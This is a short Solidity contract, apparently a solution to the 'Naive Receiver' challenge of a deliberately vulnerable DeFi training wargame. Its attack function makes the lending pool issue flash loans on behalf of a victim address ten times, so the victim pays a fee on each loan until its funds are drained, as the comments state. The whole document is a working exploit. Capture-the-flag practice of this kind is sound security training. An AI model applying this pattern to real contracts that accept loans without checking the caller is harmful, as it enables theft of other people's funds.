import "../naive-receiver/NaiveReceiverLenderPool.sol";

contract AttackNaiveReceiver {
    NaiveReceiverLenderPool pool;

    constructor(address payable _pool){
        pool = NaiveReceiverLenderPool(_pool);
    }

    function attack(address victim) public {
        // we make it 10 times because thats the amount we need to drain the contract
        for(int i = 0; i < 10; i++) {
            pool.flashLoan(victim, 1 ether);
            // we force the victim address to take flashloans and pay the fees
        }
    }
}